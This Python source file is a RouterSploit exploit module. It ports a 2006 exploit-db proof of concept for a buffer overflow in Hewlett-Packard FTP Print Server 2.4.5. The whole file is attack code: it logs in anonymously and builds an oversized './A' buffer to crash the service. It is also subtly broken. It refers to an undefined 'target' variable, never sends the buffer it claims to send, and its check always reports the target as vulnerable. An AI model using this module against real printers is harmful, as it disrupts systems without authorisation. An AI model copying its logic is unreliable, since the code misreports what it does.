#!/usr/bin/python

import sys
from ftplib import FTP
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(5600, "Target HTTP port")



    __info__ = {

        "name": "EDB-ID:2961",
        "description": "Hewlett-Packard FTP Print Server Version 2.4.5 Buffer Overflow (POC) ",
        "authors": (
            "Joxean Koret",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/2961",
        ),
        "devices": (
            "Hewlett-Packard","EDB-ID:2961"
        ),

    }
    
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_status("Hewlett-Packard FTP Print Server Version 2.4.5 Buffer Overflow (POC)")
            print_status("Copyright (c) Joxean Koret")
            print_status()

            #if len(sys.argv) == 1:
                #print "Usage: %s <target>" % sys.argv[0]
                #sys.exit(0)

            #target = sys.argv[1]

            print_status(" Running attack against " + self.target)

            try:
                ftp = FTP(target)
                try:
                    msg = ftp.login() # Login anonymously
                    print_status(msg)
                    
                    buf = "./A"
                    iMax = 9
                    for i in range(iMax):
                        buf += buf
                        
                    ftp2 = FTP(self.target)
                    
                    try:
                        msg = ftp2.login()
                        print_error("Exploit failed - No, it doesn't work :( ")
                        print_status()
                        print_status(msg)
                        #sys.exit(0)
                    except:
                        print_success(" Yes, it works.")
                        print_error(sys.exc_info()[1])

                    print_success(" Sending buffer of",len(buf[0:3000]),"byte(s) ... ")
                except:
                    print_error(" Exploit failed - Error logging anonymously.",sys.exc_info()[1])
                    #sys.exit(0)
                
            except:
                print_error("Exploit failed - Can't connect to target", self.target, ".", sys.exc_info()[1])
                #sys.exit(0)

    
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        
        return True

# milw0rm.com [2006-12-19]
